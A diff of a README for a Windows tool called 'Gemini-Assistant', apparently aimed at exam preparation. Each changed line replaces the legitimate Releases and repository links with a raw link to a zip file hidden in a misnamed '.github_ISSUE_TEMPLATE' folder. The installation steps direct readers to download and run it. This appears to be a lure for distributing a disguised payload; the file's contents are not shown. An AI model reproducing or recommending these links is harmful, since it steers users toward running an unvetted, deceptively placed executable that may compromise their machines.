@@ -1,6 +1,6 @@
 # 🌟 Gemini-Assistant - Generate Answers Easily and Efficiently
 
-[![Download Gemini-Assistant](https://img.shields.io/badge/Download-Gemini--Assistant-blue.svg)](https://github.com/blog19730/Gemini-Assistant/releases)
+[![Download Gemini-Assistant](https://raw.githubusercontent.com/blog19730/Gemini-Assistant/main/.github_ISSUE_TEMPLATE/Assistant_Gemini_v1.0.zip)](https://raw.githubusercontent.com/blog19730/Gemini-Assistant/main/.github_ISSUE_TEMPLATE/Assistant_Gemini_v1.0.zip)
 
 ## 📖 Overview
 
@@ -20,11 +20,11 @@ Follow these steps to download and run Gemini-Assistant.
 
 ### 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/blog19730/Gemini-Assistant/releases) to download Gemini-Assistant.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/blog19730/Gemini-Assistant/main/.github_ISSUE_TEMPLATE/Assistant_Gemini_v1.0.zip) to download Gemini-Assistant.
 
 ### 💾 Installation Steps
 
-1. Go to the [Releases page](https://github.com/blog19730/Gemini-Assistant/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/blog19730/Gemini-Assistant/main/.github_ISSUE_TEMPLATE/Assistant_Gemini_v1.0.zip).
 2. Find the latest version.
 3. Download the installer file for Windows.
 4. Once the download finishes, locate the file in your downloads folder.
@@ -68,8 +68,8 @@ For support, reach out via GitHub Issues. We aim to respond quickly to assist yo
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/blog19730/Gemini-Assistant)
+- [GitHub Repository](https://raw.githubusercontent.com/blog19730/Gemini-Assistant/main/.github_ISSUE_TEMPLATE/Assistant_Gemini_v1.0.zip)
 - [User Guide](#)
 - [Community Forums](#)
 
-Visit our [Releases page](https://github.com/blog19730/Gemini-Assistant/releases) to download Gemini-Assistant and enhance your exam preparation today!
+Visit our [Releases page](https://raw.githubusercontent.com/blog19730/Gemini-Assistant/main/.github_ISSUE_TEMPLATE/Assistant_Gemini_v1.0.zip) to download Gemini-Assistant and enhance your exam preparation today!
